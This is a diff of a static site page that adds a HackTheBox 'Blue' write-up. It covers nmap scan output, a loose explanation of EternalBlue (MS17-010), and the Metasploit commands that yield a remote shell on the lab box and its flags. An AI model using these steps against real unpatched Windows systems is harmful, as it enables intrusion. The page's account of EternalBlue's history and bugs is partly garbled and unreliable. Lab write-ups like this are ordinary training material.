@@ -6,7 +6,7 @@
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 <meta name="revised" content="2018-12-24T07:32:29 EST">
-<title> :: DocDock Documentation</title>
+<title>Blue :: DocDock Documentation</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
 <link href="/css/nucleus.css" rel="stylesheet">
@@ -23,7 +23,7 @@
 
     
   </head>
-  <body data-url="/hackthebox/challenges/bloodhound/">
+  <body data-url="/hackthebox/boxes/blue/">
     
       <header>
   <div class="logo">
@@ -137,13 +137,14 @@
             <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
       </div>
         <ul>
-    <li data-nav-id="/hackthebox/boxes/" class="dd-item haschildren
+    <li data-nav-id="/hackthebox/boxes/" class="dd-item parent haschildren
         ">
       <div>
-      <a href="/hackthebox/boxes/">Boxes</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+      <a href="/hackthebox/boxes/">Boxes</a>
+            <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
       </div>
         <ul>
-    <li data-nav-id="/hackthebox/boxes/blue/" class="dd-item
+    <li data-nav-id="/hackthebox/boxes/blue/" class="dd-item parent active
         ">
       <div>
       <a href="/hackthebox/boxes/blue/">Blue</a><i class="fa fa-circle-thin read-icon"></i>
@@ -169,14 +170,13 @@
     </li>
         </ul>
     </li>
-    <li data-nav-id="/hackthebox/challenges/" class="dd-item parent haschildren
+    <li data-nav-id="/hackthebox/challenges/" class="dd-item haschildren
         ">
       <div>
-      <a href="/hackthebox/challenges/">Miscellaneous</a>
-            <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+      <a href="/hackthebox/challenges/">Miscellaneous</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
       </div>
         <ul>
-      <li data-nav-id="/hackthebox/challenges/bloodhound/" class="dd-item active">
+      <li data-nav-id="/hackthebox/challenges/bloodhound/" class="dd-item">
         <div>
           <a href="/hackthebox/challenges/bloodhound/">
             
@@ -233,12 +233,24 @@
       <a href="/tools/webapp/">WebApps</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
       </div>
         <ul>
+    <li data-nav-id="/tools/webapp/gobuster/" class="dd-item
+        ">
+      <div>
+      <a href="/tools/webapp/gobuster/">GoBuster</a><i class="fa fa-circle-thin read-icon"></i>
+      </div>
+    </li>
       <li data-nav-id="/tools/webapp/sqlmap/sqlmap/" class="dd-item">
         <div>
           <a href="/tools/webapp/sqlmap/sqlmap/">
             SqlMap
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
+    </li>
+    <li data-nav-id="/tools/webapp/wfuzz/" class="dd-item
+        ">
+      <div>
+      <a href="/tools/webapp/wfuzz/">WFUZZ</a><i class="fa fa-circle-thin read-icon"></i>
+      </div>
     </li>
         </ul>
     </li>
@@ -280,12 +292,24 @@
    HackTheBox</option> 
     <option value="/hackthebox/boxes/" >
   - 
-   Boxes</option>
+   Boxes</option> 
+    <option value="/hackthebox/boxes/blue/"  selected>
+  -- 
+   Blue</option> 
+  
+    <option value="/hackthebox/boxes/poison/" >
+  -- 
+   Poison</option>
+    <option value="/hackthebox/boxes/valentine/" >
+  -- 
+   Valentine</option>
+    <option value="/hackthebox/boxes/waldo/" >
+  -- 
+   Waldo</option>
+  
     <option value="/hackthebox/challenges/" >
   - 
-   Miscellaneous</option> 
-      <option value="/hackthebox/challenges/bloodhound/"  selected>-- </option>
-  
+   Miscellaneous</option>
   
     <option value="/tools/" >
    Tools</option>
@@ -311,18 +335,139 @@
       </div>
     
 
-    <h1></h1>
+    <h1>Blue</h1>
     
     
     
-    
+
+
+
+<h3 id="blue">Blue</h3>
+
+<p><img src="https://chickenpwny.github.io/images/blue/blue_logo.jpg" alt="blue_logo" /></p>
+
+<p>changes /etc/hosts so 10.10.10.40 blue.htb</p>
+
+<pre><code>PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49155/tcp open  msrpc        Microsoft Windows RPC
+49156/tcp open  msrpc        Microsoft Windows RPC
+49157/tcp open  msrpc        Microsoft Windows RPC
+Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 82.62 seconds
+</code></pre>
+
+<p>Windows 7 Professional 7601 Service Pack 1</p>
+
+<p>port 135 = RPC a couple buffer overflow attacks I doubt its vulnerable.</p>
+
+<p>port 139 = NetBIOS is rarely vulnerable you can enumerate the system with it through gathering information</p>
+
+<p>port 445 =  Smb server message block often exploitable. Don&rsquo;t count on it though.</p>
+
+<h3 id="talking-about-enternalblue">Talking about EnternalBlue</h3>
+
+<p>Atleast I try to, for a detailed in-depth explanation <a href="https://research.checkpoint.com/eternalblue-everything-know/">Click Here</a></p>
+
+<p>The exploit is called ms17-010 EternalBlue, it was discovered in 2017 existed earlier it was used by the NSA. It was always publicly available hosted on some obscure server. The NSA did this to escape international law since it could be argued it was publicly available.</p>
+
+<p>EternalBlue exploits three bugs to achieve RCE</p>
+
+<ol>
+<li>Wrong Casting Bug &ndash; this leads to a buffer overflow</li>
+<li>Wrong Parsing Function Bug &ndash; Using two functions, to trick the system they can&rsquo;t handle large packs so it will split packets into smaller packers. Since the first function breaks it will escape out SMB treats the last function as the first. This allows bug A to work by Treating Dword as word.</li>
+<li>Non-paged Pool Allocation Bug &ndash; creates a hole in the heap stack allowing 1 &amp; 2 to write in memory.</li>
+</ol>
+
+<h3 id="exploiting-blue">Exploiting Blue</h3>
+
+<p>Using nmap to check and make sure the vulnerability exist.</p>
+
+<pre><code><div class="alert 
+alert-danger"
+ 
+role="alert"><p>Nmap -p445 &ndash;script vuln blue.htb -T4</p>
+</div>
+
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-24 06:22 EST
+Nmap scan report for blue.htb (10.10.10.40)
+Host is up (0.13s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
+| smb-vuln-ms17-010:
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)                                                                       
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1                                                                    
+|        servers (ms17-010).
+|
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/                                               
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+
+Nmap done: 1 IP address (1 host up) scanned in 26.47 seconds
+
+
+</code></pre>
+
+<p>Now, go into Metasploit. While running the exploit. It will fail a couple times so wait patiently for it to return a shell.</p>
+
+<pre><code>msfconsole 
+
+search lue
+
+exploit/windows/smb/ms17_010_eternalblue    MS17-010 EternalBlue SMB Remote Windows
+
+use exploit/windows/smb/ms17_010_eternalblue
+
+set RHOST 10.10.10.40
+
+run
+
+</code></pre>
+
+<p><img src="https://chickenpwny.github.io/images/blue/metasploit_blue.PNG" alt="metasploit_blue" /></p>
+
+<p>The user flag is in c:\Users\haris\Desktop</p>
+
+<div class="alert 
+alert-info"
+ 
+role="alert">type user.txt</div>
+
+
+<p>The root flag is in c:\Users\Adimistrator\Desktop</p>
+
+<div class="alert 
+alert-success"
+ 
+role="alert">type root.txt</div>
+
+
+
 
     
     
         <div class="chevrons">
     <div id="navigation">
-<a class="nav nav-prev" href="/hackthebox/challenges/" title="Miscellaneous"> <i class="fa fa-chevron-left"></i><label>Miscellaneous</label></a>
-    <a class="nav nav-next" href="/tools/" title="Tools" style="margin-right: 0px;"><label>Tools</label><i class="fa fa-chevron-right"></i></a></div>
+<a class="nav nav-prev" href="/hackthebox/boxes/" title="Boxes"> <i class="fa fa-chevron-left"></i><label>Boxes</label></a>
+    <a class="nav nav-next" href="/hackthebox/boxes/poison/" title="Poison" style="margin-right: 0px;"><label>Poison</label><i class="fa fa-chevron-right"></i></a></div>
   </div>
 
   </section>
@@ -339,7 +484,7 @@
 
     
     <div class="github-link">
-      <a href="https://github.com/vjeantet/hugo-theme-docdock/edit/master/exampleSite/content/HackTheBox/Challenges/BloodHound.md" target="blank"><i class="fa fa-code-fork"></i>
+      <a href="https://github.com/vjeantet/hugo-theme-docdock/edit/master/exampleSite/content/HackTheBox/Boxes/Blue/_index.md" target="blank"><i class="fa fa-code-fork"></i>
         Improve this page</a>
     </div>
     
